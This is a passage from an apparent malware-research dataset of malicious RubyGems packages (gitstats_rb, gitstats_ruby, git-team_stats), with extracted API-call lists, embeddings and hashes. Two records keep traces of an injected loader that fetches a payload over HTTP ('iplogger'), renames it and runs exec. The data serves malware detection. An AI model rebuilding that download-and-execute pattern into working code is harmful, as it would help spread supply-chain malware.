'self.inspect_commits', '@commits_in_detail.each', 'user.[](:aliases).any?', 'user.[]', 'name.==', 'commit.[]', 'user_cumulative.[]', 'user_cumulative.[]', 'commit.[]', 'user_cumulative.[]', 'commit.[]', 'commit.[](:file_types).each', 'commit.[]', 'user_cumulative.[](:file_types).key?', 'user_cumulative.[]', 'user_cumulative.[](:file_types).[](language).[]', 'user_cumulative.[](:file_types).[]', 'user_cumulative.[]', 'details.[]', 'user_cumulative.[](:file_types).[](language).[]', 'user_cumulative.[](:file_types).[]', 'user_cumulative.[]', 'details.[]', 'user_cumulative.[](:file_types).[]=', 'user_cumulative.[]', 'details.[]', 'details.[]', '@project.[](:parsers).each', '@project.[]', 'parser.get_head_short_hash.to_s.+', 'parser.get_head_short_hash.to_s', 'parser.get_head_short_hash', '$project.[](:name).to_s + \"-\" + hash_str + @project.[](:start_date).to_s + \"-\".+', '$project.[](:name).to_s + \"-\" + hash_str + @project.[](:start_date).to_s.+', '$project.[](:name).to_s + \"-\" + hash_str.+', '$project.[](:name).to_s + \"-\".+', '$project.[](:name).to_s.+', '$project.[](:name).to_s', '$project.[]', '@project.[](:start_date).to_s', '@project.[]', '@project.[](:end_date).to_s', '@project.[]', 'require', 'require', 'require', 'puts', '\"finding commits in #{@directory}\".color', 'get_rev_list', 'ProgressBar.new', 'rev_list.lines.length', 'rev_list.lines', 'rev_list.lines.each', 'rev_list.lines', 'bar.increment!', 'line.=~', 'hash.!=', 'line.=~', '$1.to_i', '@commits.push', '@commits.empty?', 'get_commits', '@commits.count', 'get_authors_from_shortlog.lines.each', 'get_authors_from_shortlog.lines', 'get_authors_from_shortlog', 'users.any? { |user,|\\n  user.[]=(:name, line)\\n}.!', 'users.any?', 'user.[]=', 'users.push', 'line.strip', 'line.strip', 'execute', 'execute(\"git rev-parse --short HEAD\", @directory).strip', 'execute', '@start_date.!=', '\"--max-age=%s \".%', '@start_date.to_i.to_s', '@start_date.to_i', '@end_date.!=', '\"--min-age=%s \".%', '@end_date.to_i.to_s', '@end_date.to_i', 'execute', '\"git rev-list --reverse --pretty=format:\\\\\"%%at %%aN <%%aE>\\\\\" %s HEAD\".%', 'execute', '\"git diff-tree %s --numstat\".%', 'execute', '\"git show %s:%s 2>&1\".%', 'get_diff_tree', 'diff_tree.lines.each', 'diff_tree.lines', 'line.=~', '$1.to_i', '$2.to_i', 'insertions.-', 'insertions.+', '$3.strip!', '@ignored_directories.any?', 'file_name.index(obj).==', 'file_name.index', 'get_language_for_file', 'language.==', 'file_types.key?', 'language.name.to_sym', 'language.name', 'file_types.[](language.name.to_sym).[]', 'file_types.[]', 'language.name.to_sym', 'language.name', 'file_types.[](language.name.to_sym).[]', 'file_types.[]', 'language.name.to_sym', 'language.name', 'file_types.[]=', 'language.name.to_sym', 'language.name', 'file_name.gsub', 'File.join', 'Dir.home', '@directory.gsub', 'File.file?', 'LanguageSniffer.detect(full_file_path).language', 'LanguageSniffer.detect', 'LanguageSniffer.detect(full_file_path, { content: get_file(commit_hash, escaped_file_name), path: full_file_path }).language', 'LanguageSniffer.detect', 'get_file', 'puts', '\"analyzing commits in #{@directory}\".color', 'ProgressBar.new', '@commits.length', '@commits.each', 'bar.increment!', 'parse_diff_tree', 'commit.[]', 'commit.merge!']",
            "n_tokens": 1349,
            "embedding": "[-0.0027492   0.01356273 -0.01020581 ...  0.00126849  0.00079281\n  0.00932799]",
            "cluster": "0",
            "id": 86,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/git-team_stats/0.0.1/git-team_stats-0.0.1.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/git-team_stats/0.0.1/git-team_stats-0.0.1_extracted",
            "name": "git-team_stats",
            "version": "0.0.1",
            "published_at": "2020-02-20T19:38:43.904Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake, json, progress_bar, rainbow, language_sniffer, gli",
            "SHA-256": "e139f4181902ed2e7f61b4fae40ac93b507316cb7f3a5888bc8c7a2a20dbd34c"
        },
        {
            "name_version": "gitstats_rb-2.0.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/gitstats_rb/2.0.0/gitstats_rb-2.0.0_extracted/gitstats_rb-2.0.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'include', 'attr_reader', 'attr_reader', 'self.class.include_mail', 'self.class', 'name', 'email', 'name', 'to_s.hash.==', 'to_s.hash', 'to_s', 'b.to_s.hash', 'b.to_s', 'to_s.hash', 'to_s', 'attr_reader', 'attr_reader', 'attr_reader', 'FileUtils.mkdir_p', 'File.dirname', 'File.new', '@cache.nil?', '@cache.close', 'Marshal.dump', 'obj.size.>', 'obj.size', 'raise', '((obj.size >> 8) & 255)\\n.chr', '(obj.size >> 8)\\n.&', 'obj.size.>>', 'obj.size', '(obj.size & 255)\\n.chr', 'obj.size.&', 'obj.size', '@cache.write', '@cache.flush', 'File.new', 'f.eof?.!', 'f.eof?', 'f.read', '(tmp.[](0) << 8)\\n.+', 'tmp.[](0).<<', 'tmp.[]', 'tmp.[]', 'f.read', 'obj.size.!=', 'obj.size', 'raise', 'Marshal.load', 'f.close', 'last.nil?', '@cachefile.nil?', 'read_cache', 'block.call', 'last.[]', '@cachefile.nil?', 'open_cache', 'sh', 'line.valid_encoding?', 'line.force_encoding(\"ISO-8859-15\").encode!', 'line.force_encoding', 'line.=~', 'commit.nil?', '@cachefile.nil?', 'write_cache', 'block.call', 'line.split', 'parts.shift', 'Hash.new', 'commit.[]=', 'Time.at', 'parts.[](0).to_i', 'parts.[]', 'commit.[]=', 'parts.[]', 'commit.[]=', 'parts.[]', 'commit.[]=', 'parts.[]', '/^(.+) <(.+)>$/.match', 'parts.[]', 'match.nil?', 'parts.[]', 'match.captures', 'commit.[]=', 'Author.new', 'commit.[]=', 'commit.[]=', 'commit.[]=', 'commit.[]=', 'line.==', '@cachefile.nil?', 'write_cache', 'block.call', 'line.=~', 'line.=~', 'commit.[]', 'line.=~', 'commit.[]', '/^(\\\\d+)\\\\s+(\\\\d+)/.match', 'match.nil?', 'match.captures', 'commit.[]', 'added.to_i', 'commit.[]', 'deleted.to_i', 'commit.nil?', '@cachefile.nil?', 'write_cache', 'block.call', '@cachefile.nil?', 'close_cache', 'sh(\"git ls-tree -r -l #{ref}\").split(/\\\\n/).each', 'sh(\"git ls-tree -r -l #{ref}\").split', 'sh', 'line.split', 'parts.[](1).!=', 'parts.[]', 'Hash.new', 'file.[]=', 'parts.[]', 'file.[]=', 'parts.[](3).to_i', 'parts.[]', 'file.[]=', 'parts.[]', 'block.call', 'private', 'puts', 'Dir.chdir', 'block.nil?', 'IO.popen', 'io.each_line', 'block.call', 'line.chomp', 'Array.new', '@@renderers.<<', '@@renderers.map', 'x.new', 'Dir.chdir(@templatedir) {\\n  Dir.glob(\"*\").sort\\n}.each', 'Dir.chdir', 'Dir.glob(\"*\").sort', 'Dir.glob', 'File.file?', 'File.join', '@renderers.find', 'r.handle?', 'r.nil?', 'puts', 'FileUtils.copy', 'File.join', 'puts', 'r.name', 'r.render', 'attr_reader', 'Gnuplot.open', 'Gnuplot::Plot.new', 'plot.terminal', 'plot.size', 'plot.output', 'File.join', '@helper.outdir', 'File.basename(@helper.filename, \".plot\").+', 'File.basename', '@helper.filename', 'plot.nokey', 'plot.xtics', 'plot.ytics', 'plot.grid', '{ setrange: true, limitlabels: true, labelcount: 15 }.merge', 'Array.new', 'Array.new', 'Array.new', 'args.[]', 'limitlabels', 'args.[]', 'args.[]', '@plot.xrange', 'x.first.-', 'x.first', 'x.last.+', 'x.last', '@plot.data.<<', '@plot.data', 'Gnuplot::DataSet.new', 'ds.using=', 'ds.with=', 'ds.notitle', '{ setrange: true, limitlabels: true, labelcount: 15, firstlabel: \"\\\\\"\\\\\"\" }.merge', 'Array.new', 'Array.new', 'Array.new', 'args.[]', 'limitlabels', 'args.[]', 'args.[]', '@plot.xrange', 'x.first.-', 'x.first', 'x.last.+', 'x.last', 'args.[](:firstlabel).nil?', 'args.[]', 'x.insert', 'x.first.-', 'x.first', 'l.insert', 'args.[]', 'y.insert', '@plot.data.<<', '@plot.data', 'Gnuplot::DataSet.new', 'ds.using=', 'ds.with=', 'ds.notitle', 'private', 'l.size', 'cnt.>', '(cnt / maxcount + 0.5).round.to_i', '(cnt / maxcount + 0.5)\\n.round', 'cnt / maxcount.+', 'cnt./', 'l.map!', '(i % step)\\n.==', 'i.%', 'i.==', 'cnt.-', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'Dir.glob(File.join(templatedir, \"helpers\", \"*.rb\")).sort.each', 'Dir.glob(File.join(templatedir, \"helpers\", \"*.rb\")).sort', 'Dir.glob', 'File.join', 'eval', 'IO.readlines(file).join', 'IO.readlines', 'eval', 'Plotter.new', 'plotter.run', 'file.=~', 'File.join', 'IO.readlines(ifile).join', 'IO.readlines', 'PlotHelper.new(@templatedir, file, @outdir, stats, @verbose).run', 'PlotHelper.new', 'Renderer.register', 'attr_reader', 'Dir.glob(File.join(templatedir, \"helpers\", \"*.rb\")).sort.each', 'Dir.glob(File.join(templatedir, \"helpers\", \"*.rb\")).sort', 'Dir.glob', 'File.join', 'eval', 'IO.readlines(file).join', 'IO.readlines', 'name.to_s', 'puts', 'hash.is_a?', 'hash.to_h', 'IO.readlines(File.join(@templatedir, \"partials\", \"#{name}.haml\")).join', 'IO.readlines', 'File.join', 'Haml::Engine.new', 'engine.render', 'name.to_s', 'file.=~', 'File.join', 'File.join', 'File.basename(file, \".haml\").+', 'File.basename', 'IO.readlines(ifile).join', 'IO.readlines', 'HamlHelper.new', 'Haml::Engine.new', 'engine.render', 'helper.get_layout.nil?.!', 'helper.get_layout.nil?', 'helper.get_layout', 'puts', 'helper.get_layout', 'IO.readlines(File.join(@templatedir, \"layouts\", helper.get_layout + \".haml\")).join', 'IO.readlines', 'File.join', 'helper.get_layout.+', 'helper.get_layout', 'Haml::Engine.new', 'engine.render', 'File.new(ofile, \"w\").write', 'File.new', 'Renderer.register', 'file.=~', 'file.=~', 'file.=~', 'File.join', 'File.join', 'File.basename(file, if scss\\n  \".scss\"\\nelse\\n  \".sass\"\\nend).+', 'File.basename', 'IO.readlines(ifile).join', 'IO.readlines', 'Compass.sass_engine_options', 'options.[]=', 'Sass::Engine.new', 'engine.render', 'File.new(ofile, \"w\").write', 'File.new', 'Renderer.register', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'Array.new', 'Hash.new', 'CommitStats.new', 'AuthorsCommitStats.new', 'YearCommitStats.new', 'MonthCommitStats.new', 'YearMonthCommitStats.new', 'DateCommitStats.new', 'HourCommitStats.new', 'DayOfWeekCommitStats.new', 'LastWeeksCommitStats.new', 'FileStats.new', 'FileTypeFileStats.new', '@author_stats.size', 'Array.new', '@repostate.keys.each', '@repostate.keys', '@repos.find { |x,|\\n  x.name == name\\n}.nil?', '@repos.find', 'x.name.==', 'x.name', '@commitcache.nil?', 'File.join', 'name.tr', '@repos.<<', 'Git.new', 'add', 'value.[]', 'value.[]', 'value.[]', 'FileStats.new', 'FileTypeFileStats.new', '@repos.each', '@repostate.[]', 'repo.name', 'puts', 'repo.name', 'repo.get_commits', '@repostate.[](repo.name).[]', '@repostate.[]', 'repo.name', '@future.!', 'commit.[](:time).>', 'commit.[]', 'Time.now', '@maxage.>', '(Time.now - commit.[](:time))\\n.>', 'Time.now.-', 'Time.now', 'commit.[]', '(@num_commits % 100)\\n.==', '@num_commits.%', 'puts', '@general_stats.update', '@author_stats.update', '@year_stats.update', '@month_stats.update', '@yearmonth_stats.update', '@date_stats.update', '@hour_stats.update', '@wday_stats.update', '@lastweeks_stats.update', '@repostate.[](repo.name).[]=', '@repostate.[]', 'repo.name', 'commit.[]', 'repo.get_files', '@file_stats.update', '@filetype_stats.update', '@hash.send', '@hash.keys.sort.each', '@hash.keys.sort', '@hash.keys', '@hash.[]', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', '@files_added.-', '@lines_added.-', 'commit.[]', 'commit.[]', 'commit.[]', 'commit.[]', 'commit.[]', 'commit.[]', 'commit.[](:time).<', 'commit.[]', 'commit.[]', 'commit.[](:time).>', 'commit.[]', 'commit.[]', '@days.size', 'commit.[](:time).to_date', 'commit.[]', '@days.[]', 'CommitAccumulator.new', '@days.[](day).update', '@days.[]', 'include', 'Hash.new', 'commit.[]', '@hash.[]', 'CommitStats.new', '@hash.[](author).update', '@hash.[]', 'include', 'Hash.new', 'commit.[](:time).year', 'commit.[]', '@hash.[]', 'AuthorsCommitStats.new', '@hash.[](year).update', '@hash.[]', 'include', 'Hash.new', 'commit.[](:time).month', 'commit.[]', '@hash.[]', 'AuthorsCommitStats.new', '@hash.[](month).update', '@hash.[]', 'include', 'Hash.new', 'YearMonth.new', 'commit.[]', '@hash.[]', 'AuthorsCommitStats.new', '@hash.[](yearmonth).update', '@hash.[]', 'include', 'Hash.new', 'commit.[]', 'Date.civil', 't.year', 't.month', 't.day', '@hash.[]', 'AuthorsCommitStats.new', '@hash.[](date).update', '@hash.[]', 'include', 'Hash.new', 'commit.[](:time).hour', 'commit.[]', '@hash.[]', 'CommitStats.new', '@hash.[](hour).update', '@hash.[]', 'include', 'Hash.new', 'commit.[](:time).wday', 'commit.[]', '@hash.[]', 'HourCommitStats.new', '@hash.[](day).update', '@hash.[]', 'include', 'Time.now.to_date', 'Time.now', 'Date.commercial(today.cwyear, today.cweek).+', 'Date.commercial', 'today.cwyear', 'today.cweek', 'Hash.new', 'nextCwStart.to_time', 'commit.[](:time).>', 'commit.[]', '((@base - commit.[](:time)) / 604800)\\n.to_i', '(@base - commit.[](:time))\\n./', '@base.-', 'commit.[]', 'diff.>=', '@hash.[]', 'CommitStats.new', '@hash.[](diff).update', '@hash.[]', 'attr_reader', 'attr_reader', 'file.[]', 'include', 'Hash.new', 'File.extname', 'file.[]', '@hash.[]', 'FileStats.new', '@hash.[](type).update', '@hash.[]', 'include', 'attr_reader', 'attr_reader', 'a.is_a?', 'a.year', 'a.month', 'b.nil?', '(a / 100)\\n.to_i', 'a./', 'a.%', 'a.to_i', 'b.to_i', 'to_i.<=>', 'to_i', 'b.to_i', '@year * 12 + @month.-', '@year * 12.+', '@year.*', '\"%04d-%02d\".%', 'to_i.==', 'to_i', 'b.to_i', 'to_i', 'partial', 'haml_concat', 'partial', 'haml_concat', 'name.to_s', 'haml_concat', 'blocktoc', 'args.each', 'block_given?', 'partial', 'partial', 'self.extend', 'self.extend', 'author_count', 'top_author_count', 'top_author_count', '@names.[](name).nil?', '@names.[]', 'name.to_s', '@names.[]', 'self.extend', 'i.>', '\"%dG\".%', '(i / 1000000000)\\n.to_i', 'i./', 'i.>', '\"%dM\".%', '(i / 1000000)\\n.to_i', 'i./', 'i.>', '\"%dk\".%', '(i / 1000)\\n.to_i', 'i./', 'i.to_s', 'self.extend', 'partial', 'haml_concat', 'name.to_s', 'haml_concat', 'args.each', '@toc.<<', 'block_given?', 'partial', 'partial', 'self.extend', '@names.[](name).nil?', '@names.[]', 'name.to_s', '@names.[]', 'monthnames.[]', 'monthnames', 'month.-', 'self.extend', 'maxAuthorsInGraph', '2.*', 'maxDaysPerAuthorInGraph', '2.*', 'maxDaysInGraph', 'self.extend']",
            "n_tokens": 3446,
            "embedding": "[ 0.00707077 -0.00663436 -0.01196441 ... -0.00177137  0.00162182\n  0.01643636]",
            "cluster": "0",
            "id": 757,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/gitstats_rb/2.0.0/gitstats_rb-2.0.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/gitstats_rb/2.0.0/gitstats_rb-2.0.0_extracted",
            "name": "gitstats_rb",
            "version": "2.0.0",
            "published_at": "2020-02-20T19:41:17.048Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "haml, sass, compass, compass-blueprint, gnuplot",
            "SHA-256": "cf7f2b1cfcbf43de8dc9665f0691e3269c07a42f41f957fa8d1660acdbc97e6f"
        },
        {
            "name_version": "gitstats_ruby-1.0.1",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/gitstats_ruby/1.0.1/gitstats_ruby-1.0.1_extracted/gitstats_ruby-1.0.1_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'include', 'attr_reader', 'attr_reader', 'to_i.<=>', 'to_i', 'b.to_i', 'self.class.include_mail', 'self.class', 'name', 'email', 'name', 'to_s.hash.==', 'to_s.hash', 'to_s', 'b.to_s.hash', 'b.to_s', 'to_s.hash', 'to_s', 'attr_reader', 'attr_reader', 'attr_reader', 'File.new', '@cache.nil?', '@cache.close', 'Marshal.dump', 'obj.size.>', 'obj.size', 'raise', '((obj.size >> 8) & 255)\\n.chr', '(obj.size >> 8)\\n.&', 'obj.size.>>', 'obj.size', '(obj.size & 255)\\n.chr', 'obj.size.&', 'obj.size', '@cache.write', '@cache.flush', 'File.new', 'f.eof?.!', 'f.eof?', 'f.read', '(tmp.[](0) << 8)\\n.+', 'tmp.[](0).<<', 'tmp.[]', 'tmp.[]', 'f.read', 'obj.size.!=', 'obj.size', 'raise', 'Marshal.load', 'f.close', 'last.nil?', '@cachefile.nil?', 'read_cache', 'block.call', 'last.[]', '@cachefile.nil?', 'open_cache', 'sh', 'line.=~', 'commit.nil?', '@cachefile.nil?', 'write_cache', 'block.call', 'line.split', 'parts.shift', 'Hash.new', 'commit.[]=', 'Time.at', 'parts.[](0).to_i', 'parts.[]', 'commit.[]=', 'parts.[]', 'commit.[]=', 'parts.[]', 'commit.[]=', 'parts.[]', '/^(.+) <(.+)>$/.match', 'parts.[]', 'match.nil?', 'parts.[]', 'match.captures', 'commit.[]=', 'Author.new', 'commit.[]=', 'commit.[]=', 'commit.[]=', 'commit.[]=', 'line.==', '@cachefile.nil?', 'write_cache', 'block.call', 'line.=~', 'line.=~', 'commit.[]', 'line.=~', 'commit.[]', '/^(\\\\d+)\\\\s+(\\\\d+)/.match', 'match.nil?', 'match.captures', 'commit.[]', 'added.to_i', 'commit.[]', 'deleted.to_i', 'commit.nil?', '@cachefile.nil?', 'write_cache', 'block.call', '@cachefile.nil?', 'close_cache', 'sh(\"git ls-tree -r -l #{ref}\").split(/\\\\n/).each', 'sh(\"git ls-tree -r -l #{ref}\").split', 'sh', 'line.split', 'parts.[](1).!=', 'parts.[]', 'Hash.new', 'file.[]=', 'parts.[]', 'file.[]=', 'parts.[](3).to_i', 'parts.[]', 'file.[]=', 'parts.[]', 'block.call', 'private', 'puts', 'Dir.chdir', 'block.nil?', 'IO.popen', 'io.each_line', 'block.call', 'line.chomp', 'Array.new', '@@renderers.<<', '@@renderers.map', 'x.new', 'Dir.chdir(@templatedir) {\\n  Dir.glob(\"*\").sort\\n}.each', 'Dir.chdir', 'Dir.glob(\"*\").sort', 'Dir.glob', 'File.file?', 'File.join', '@renderers.find', 'r.handle?', 'r.nil?', 'puts', 'FileUtils.copy', 'File.join', 'puts', 'r.name', 'r.render', 'attr_reader', 'Gnuplot.open', 'Gnuplot::Plot.new', 'plot.terminal', 'plot.size', 'plot.output', 'File.join', '@helper.outdir', 'File.basename(@helper.filename, \".plot\").+', 'File.basename', '@helper.filename', 'plot.nokey', 'plot.xtics', 'plot.ytics', 'plot.grid', '{ setrange: true, limitlabels: true, labelcount: 15 }.merge', 'Array.new', 'Array.new', 'Array.new', 'args.[]', 'limitlabels', 'args.[]', 'args.[]', '@plot.xrange', 'x.first.-', 'x.first', 'x.last.+', 'x.last', '@plot.data.<<', '@plot.data', 'Gnuplot::DataSet.new', 'ds.using=', 'ds.with=', 'ds.notitle', '{ setrange: true, limitlabels: true, labelcount: 15, firstlabel: \"\\\\\"\\\\\"\" }.merge', 'Array.new', 'Array.new', 'Array.new', 'args.[]', 'limitlabels', 'args.[]', 'args.[]', '@plot.xrange', 'x.first.-', 'x.first', 'x.last.+', 'x.last', 'args.[](:firstlabel).nil?', 'args.[]', 'x.insert', 'x.first.-', 'x.first', 'l.insert', 'args.[]', 'y.insert', '@plot.data.<<', '@plot.data', 'Gnuplot::DataSet.new', 'ds.using=', 'ds.with=', 'ds.notitle', 'private', 'l.size', 'cnt.>', '(cnt / maxcount + 0.5).round.to_i', '(cnt / maxcount + 0.5)\\n.round', 'cnt / maxcount.+', 'cnt./', 'l.map!', '(i % step)\\n.==', 'i.%', 'i.==', 'cnt.-', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'Dir.glob(File.join(templatedir, \"helpers\", \"*.rb\")).sort.each', 'Dir.glob(File.join(templatedir, \"helpers\", \"*.rb\")).sort', 'Dir.glob', 'File.join', 'eval', 'IO.readlines(file).join', 'IO.readlines', 'eval', 'Plotter.new', 'plotter.run', 'file.=~', 'File.join', 'IO.readlines(ifile).join', 'IO.readlines', 'PlotHelper.new(@templatedir, file, @outdir, stats, @verbose).run', 'PlotHelper.new', 'Renderer.register', 'attr_reader', 'Dir.glob(File.join(templatedir, \"helpers\", \"*.rb\")).sort.each', 'Dir.glob(File.join(templatedir, \"helpers\", \"*.rb\")).sort', 'Dir.glob', 'File.join', 'eval', 'IO.readlines(file).join', 'IO.readlines', 'name.to_s', 'puts', 'hash.is_a?', 'hash.to_h', 'IO.readlines(File.join(@templatedir, \"partials\", \"#{name}.haml\")).join', 'IO.readlines', 'File.join', 'Haml::Engine.new', 'engine.render', 'name.to_s', 'file.=~', 'File.join', 'File.join', 'File.basename(file, \".haml\").+', 'File.basename', 'IO.readlines(ifile).join', 'IO.readlines', 'HamlHelper.new', 'Haml::Engine.new', 'engine.render', 'helper.get_layout.nil?.!', 'helper.get_layout.nil?', 'helper.get_layout', 'puts', 'helper.get_layout', 'IO.readlines(File.join(@templatedir, \"layouts\", helper.get_layout + \".haml\")).join', 'IO.readlines', 'File.join', 'helper.get_layout.+', 'helper.get_layout', 'Haml::Engine.new', 'engine.render', 'Object.new', 'File.new(ofile, \"w\").write', 'File.new', 'Renderer.register', 'file.=~', 'file.=~', 'file.=~', 'File.join', 'File.join', 'File.basename(file, if scss\\n  \".scss\"\\nelse\\n  \".sass\"\\nend).+', 'File.basename', 'IO.readlines(ifile).join', 'IO.readlines', 'Compass.sass_engine_options', 'options.[]=', 'Sass::Engine.new', 'engine.render', 'File.new(ofile, \"w\").write', 'File.new', 'Renderer.register', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'Array.new', 'Hash.new', 'CommitStats.new', 'AuthorsCommitStats.new', 'YearCommitStats.new', 'MonthCommitStats.new', 'YearMonthCommitStats.new', 'DateCommitStats.new', 'HourCommitStats.new', 'DayOfWeekCommitStats.new', 'LastWeeksCommitStats.new', 'FileStats.new', 'FileTypeFileStats.new', '@author_stats.size', 'Array.new', '@repostate.keys.each', '@repostate.keys', '@repos.find { |x,|\\n  x.name == name\\n}.nil?', '@repos.find', 'x.name.==', 'x.name', '@commitcache.nil?', 'File.join', 'name.tr', '@repos.<<', 'Git.new', 'add', 'value.[]', 'value.[]', 'value.[]', 'FileStats.new', 'FileTypeFileStats.new', '@repos.each', '@repostate.[]', 'repo.name', 'puts', 'repo.name', 'repo.get_commits', '@repostate.[](repo.name).[]', '@repostate.[]', 'repo.name', '@future.!', 'commit.[](:time).>', 'commit.[]', 'Time.now', '@maxage.>', '(Time.now - commit.[](:time))\\n.>', 'Time.now.-', 'Time.now', 'commit.[]', '(@num_commits % 100)\\n.==', '@num_commits.%', 'puts', '@general_stats.update', '@author_stats.update', '@year_stats.update', '@month_stats.update', '@yearmonth_stats.update', '@date_stats.update', '@hour_stats.update', '@wday_stats.update', '@lastweeks_stats.update', '@repostate.[](repo.name).[]=', '@repostate.[]', 'repo.name', 'commit.[]', 'repo.get_files', '@file_stats.update', '@filetype_stats.update', '@hash.send', '@hash.keys.sort.each', '@hash.keys.sort', '@hash.keys', '@hash.[]', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', '@days.size', 'Array.new', 'commit.[]', 'commit.[]', 'commit.[]', 'commit.[]', '@files_added.-', '@lines_added.-', 'commit.[]', 'commit.[]', 'commit.[](:time).<', 'commit.[]', 'commit.[]', 'commit.[](:time).>', 'commit.[]', 'commit.[]', 'commit.[](:time).year * 10000 + commit.[](:time).month.*(100).+', 'commit.[](:time).year * 10000.+', 'commit.[](:time).year.*', 'commit.[](:time).year', 'commit.[]', 'commit.[](:time).month.*', 'commit.[](:time).month', 'commit.[]', 'commit.[](:time).day', 'commit.[]', '@days.include?', '@days.<<', 'include', 'Hash.new', 'commit.[]', '@hash.[]', 'CommitStats.new', '@hash.[](author).update', '@hash.[]', 'include', 'Hash.new', 'commit.[](:time).year', 'commit.[]', '@hash.[]', 'AuthorsCommitStats.new', '@hash.[](year).update', '@hash.[]', 'include', 'Hash.new', 'commit.[](:time).month', 'commit.[]', '@hash.[]', 'AuthorsCommitStats.new', '@hash.[](month).update', '@hash.[]', 'include', 'Hash.new', 'YearMonth.new', 'commit.[]', '@hash.[]', 'AuthorsCommitStats.new', '@hash.[](yearmonth).update', '@hash.[]', 'include', 'Hash.new', 'commit.[]', 'Date.civil', 't.year', 't.month', 't.day', '@hash.[]', 'AuthorsCommitStats.new', '@hash.[](date).update', '@hash.[]', 'include', 'Hash.new', 'commit.[](:time).hour', 'commit.[]', '@hash.[]', 'CommitStats.new', '@hash.[](hour).update', '@hash.[]', 'include', 'Hash.new', 'commit.[](:time).wday', 'commit.[]', '@hash.[]', 'HourCommitStats.new', '@hash.[](day).update', '@hash.[]', 'include', 'Hash.new', 'Time.now', 'commit.[](:time).>', 'commit.[]', '((@base - commit.[](:time)) / 604800)\\n.to_i', '(@base - commit.[](:time))\\n./', '@base.-', 'commit.[]', 'diff.>=', '@hash.[]', 'CommitStats.new', '@hash.[](diff).update', '@hash.[]', 'attr_reader', 'attr_reader', 'file.[]', 'include', 'Hash.new', 'File.extname', 'file.[]', '@hash.[]', 'FileStats.new', '@hash.[](type).update', '@hash.[]', 'include', 'attr_reader', 'attr_reader', 'a.is_a?', 'a.year', 'a.month', 'b.nil?', '(a / 100)\\n.to_i', 'a./', 'a.%', 'a.to_i', 'b.to_i', 'to_i.<=>', 'to_i', 'b.to_i', '@year * 12 + @month.-', '@year * 12.+', '@year.*', '\"%04d-%02d\".%', 'to_i.==', 'to_i', 'b.to_i', 'to_i', 'partial', 'haml_concat', 'partial', 'haml_concat', 'name.to_s', 'haml_concat', 'blocktoc', 'args.each', 'block_given?', 'partial', 'partial', 'self.extend', 'self.extend', 'author_count', 'top_author_count', 'top_author_count', '@names.[](name).nil?', '@names.[]', 'name.to_s', '@names.[]', 'self.extend', 'i.>', '\"%dG\".%', '(i / 1000000000)\\n.to_i', 'i./', 'i.>', '\"%dM\".%', '(i / 1000000)\\n.to_i', 'i./', 'i.>', '\"%dk\".%', '(i / 1000)\\n.to_i', 'i./', 'i.to_s', 'self.extend']",
            "n_tokens": 3354,
            "embedding": "[ 0.00038826 -0.00050771 -0.01463367 ...  0.00378061  0.00166425\n  0.01741964]",
            "cluster": "0",
            "id": 398,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/gitstats_ruby/1.0.1/gitstats_ruby-1.0.1.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/gitstats_ruby/1.0.1/gitstats_ruby-1.0.1_extracted",
            "name": "gitstats_ruby",
            "version": "1.0.1",
            "published_at": "2020-02-20T19:42:04.374Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "haml, sass, compass, gnuplot",
            "SHA-256": "9004a5b80f17afce2b8b771e138201142c312856d49860244e84c0565a60694e"
        },
        {
            "name_version": "alerty_plugin-slack-0.0.1",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/alerty_plugin-slack/0.0.1/alerty_plugin-slack-0.0.1_extracted/alerty_plugin-slack-0.0.1_sourcecode.rb",
            "Source": "Backstabber-Knife",
